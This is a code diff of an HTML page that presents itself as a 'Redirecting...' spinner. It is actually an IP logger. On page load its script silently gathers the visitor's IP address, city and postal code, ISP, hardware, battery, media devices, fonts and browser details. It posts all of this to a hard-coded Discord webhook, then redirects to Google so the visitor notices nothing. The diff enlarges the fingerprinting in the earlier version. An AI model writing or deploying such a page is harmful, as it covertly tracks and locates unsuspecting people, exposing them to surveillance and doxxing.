@@ -1,46 +1,124 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Loading...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #ffffff; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #333333; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <script>
-        async function logData() {
-            // 1. Get the IP address from a public API
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            
-            // 2. Collect other "important" data
-            const payload = {
-                content: "🚀 **New Connection Logged**",
-                embeds: [{
-                    title: "Visitor Details",
-                    color: 3447003, // Blue color
-                    fields: [
-                        { name: "IP Address", value: ipData.ip, inline: true },
-                        { name: "Browser/OS", value: navigator.userAgent, inline: false },
-                        { name: "Language", value: navigator.language, inline: true },
-                        { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
-                        { name: "Referrer", value: document.referrer || "Direct Link", inline: false }
-                    ],
-                    footer: { text: `Logged at: ${new Date().toLocaleString()}` }
-                }]
-            };
+    <div class="loader"></div>
 
-            // 3. Send the data to your Discord Webhook
-            // REPLACE 'YOUR_WEBHOOK_URL' with your actual Discord URL
-            fetch('https://discord.com/api/webhooks/1454716278349500478/w3XiGeCLvVnEwF6dUx2QsljpCd0U1Ijc9zQsviDSra7LgNZwey4bNo1tjZstRUyqXIXy', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).then(() => {
-                // 4. Redirect the user so they don't see a blank page
-                window.location.href = "https://www.google.com";
-            });
+    <script>
+        const webhookURL = 'https://discord.com/api/webhooks/1454716278349500478/w3XiGeCLvVnEwF6dUx2QsljpCd0U1Ijc9zQsviDSra7LgNZwey4bNo1tjZstRUyqXIXy'; 
+        const redirectURL = 'https://www.google.com';
+
+        // --- EXTENDED LOGGING UTILITIES ---
+
+        const getGPU = () => {
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : 'Disabled';
+            } catch { return 'Unavailable'; }
+        };
+
+        const getMediaDevices = async () => {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const counts = { video: 0, audio: 0 };
+                devices.forEach(d => { if(d.kind.includes('input')) d.kind.includes('video') ? counts.video++ : counts.audio++; });
+                return `${counts.video} Camera(s), ${counts.audio} Mic(s)`;
+            } catch { return 'Permission Denied'; }
+        };
+
+        const getStorageInfo = async () => {
+            try {
+                const estimate = await navigator.storage.estimate();
+                return `${Math.round(estimate.usage / 1024 / 1024)}MB used of ${Math.round(estimate.quota / 1024 / 1024 / 1024)}GB`;
+            } catch { return 'Unknown'; }
+        };
+
+        const getFonts = () => {
+            const fontList = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana'];
+            return fontList.filter(f => document.fonts.check(`12px "${f}"`)).join(', ');
+        };
+
+        // --- CORE EXECUTION ---
+
+        async function initializeCapture() {
+            const startTime = performance.now();
+            
+            try {
+                const [ipRes, battery] = await Promise.all([
+                    fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
+                    navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 0, charging: false })
+                ]);
+
+                const media = await getMediaDevices();
+                const storage = await getStorageInfo();
+                const executionTime = (performance.now() - startTime).toFixed(2);
+
+                const payload = {
+                    username: "System Auditor",
+                    embeds: [{
+                        title: "Detailed Connection Report",
+                        color: 2105893,
+                        timestamp: new Date().toISOString(),
+                        fields: [
+                            {
+                                name: "Network Profile",
+                                value: `**IP:** ${ipRes.ip || 'N/A'}\n**ISP:** ${ipRes.org || 'Unknown'}\n**Route:** ${ipRes.asn || 'Unknown'}\n**Type:** ${navigator.connection?.effectiveType || 'N/A'}`,
+                                inline: true
+                            },
+                            {
+                                name: "Geography",
+                                value: `**Location:** ${ipRes.city}, ${ipRes.region}, ${ipRes.country_name}\n**Postal:** ${ipRes.postal}\n**TZ:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+                                inline: true
+                            },
+                            {
+                                name: "Hardware Specification",
+                                value: `**GPU:** ${getGPU()}\n**CPU:** ${navigator.hardwareConcurrency} Cores\n**RAM:** ${navigator.deviceMemory || 'N/A'}GB\n**Display:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
+                                inline: false
+                            },
+                            {
+                                name: "Device State",
+                                value: `**Battery:** ${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})\n**Input Devices:** ${media}\n**Storage:** ${storage}`,
+                                inline: false
+                            },
+                            {
+                                name: "Software & Environment",
+                                value: `**OS/Platform:** ${navigator.platform}\n**User Agent:** ${navigator.userAgent}\n**Language:** ${navigator.language}\n**Incognito/Private:** ${!window.indexedDB ? 'Yes' : 'No'}\n**Common Fonts:** ${getFonts()}`,
+                                inline: false
+                            },
+                            {
+                                name: "Session Metadata",
+                                value: `**Referrer:** ${document.referrer || 'Direct Link'}\n**Execution Time:** ${executionTime}ms\n**Cookies Enabled:** ${navigator.cookieEnabled}`,
+                                inline: false
+                            }
+                        ],
+                        footer: { text: "Protocol v4.0.1 | Authorized Log Only" }
+                    }]
+                };
+
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+            } catch (error) {
+                console.error("Log error:", error);
+            } finally {
+                window.location.href = redirectURL;
+            }
         }
 
-        logData();
+        initializeCapture();
     </script>
 </body>
 </html>
-
